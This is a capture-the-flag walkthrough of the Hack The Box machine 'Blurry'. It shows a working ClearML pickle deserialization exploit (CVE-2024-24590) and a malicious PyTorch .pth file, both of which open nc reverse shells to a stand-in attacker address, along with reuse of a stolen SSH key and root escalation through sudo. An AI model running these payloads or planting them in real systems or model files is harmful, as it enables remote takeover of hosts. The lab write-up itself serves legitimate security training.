🔍 HTB: Blurry — Full Walkthrough (Hard)
🧠 Overview

In this write-up, we dive into HTB: Blurry, a machine rated as Hard, where we chain together multiple misconfigurations and vulnerabilities to achieve full root access. Here’s a quick summary:

    Gained initial foothold via ClearML Pickle Deserialization RCE (CVE-2024–24590)

    Escalated to persistent access by retrieving the user’s OpenSSH private key

    Privilege escalation to root through evaluate_model binary abusing PyTorch deserialization

Let’s break it all down step-by-step.
🔎 Recon

Started with an Nmap scan:

nmap -sC -sV <TARGET-IP> -v

Port 80 was open and redirected to:
http://app.blurry.htb

Added to /etc/hosts:

<TARGET-IP> app.blurry.htb

Accessing the web app with a random username (e.g. admin) automatically dropped us into a dashboard — no authentication required.
⚔️ Initial Access – CVE-2024-24590 (ClearML RCE)

The dashboard hinted at a GitHub repo (now removed), but the PoC exploit was recoverable and used the ClearML platform's deserialization logic to trigger an RCE.

Exploit (exploit.py):

from clearml import Task
import pickle, os

class RunCommand:
    def __reduce__(self):
        return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER-IP> 4444 >/tmp/f',))

command = RunCommand()
task = Task.init(project_name='Black Swan', task_name='pickle_artifact_upload', tags=["review"])
task.upload_artifact(name='pickle_artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl")

⚙️ Setup Steps

    Installed clearml via pip:

pip install clearml

Added to /etc/hosts:

    <TARGET-IP> api.blurry.htb

    Ran clearml-init and used credentials from “Getting Started > Create New Credentials”.

    Executed the exploit and got a reverse shell as jippity.

🗝️ Post-Exploitation: Persistent SSH Access

Dumped and saved the OpenSSH private key for jippity, allowing persistent access:

chmod 600 id_rsa
ssh -i id_rsa jippity@<TARGET-IP>

🧬 Privilege Escalation – PyTorch .pth Injection

Discovered jippity could execute the following as root via sudo:

/usr/bin/evaluate_model <.pth file>  (in /models/)

Also, the /models/ directory was group-writable by jippity.
🔥 Root Shell via Malicious PyTorch File

We crafted a malicious .pth file using PyTorch that leverages the __reduce__() method to spawn a reverse shell as root.

Payload:

import torch
import torch.nn as nn
import os

class MaliciousModel(nn.Module):
    def __init__(self):
        super(MaliciousModel, self).__init__()
        self.dense = nn.Linear(10, 1)

    def forward(self, x):
        return self.dense(x)

    def __reduce__(self):
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> 9001 >/tmp/f"
        return os.system, (cmd,)

malicious_model = MaliciousModel()
torch.save(malicious_model, 'exploit.pth')

    Uploaded exploit.pth to /models/ on the target.

    Started a listener:

nc -lvnp 9001

Ran:

    sudo /usr/bin/evaluate_model /models/exploit.pth

🚀 Root shell obtained.
📜 Flags

    user.txt ✔️

    root.txt ✔️

🧠 Final Thoughts

Blurry showcases a dangerous combo:

    Deserialization in machine learning pipelines (ClearML)

    Insecure sudo rules

    Improper directory permissions

Stay sharp, patch fast, and always audit deserialization surfaces.
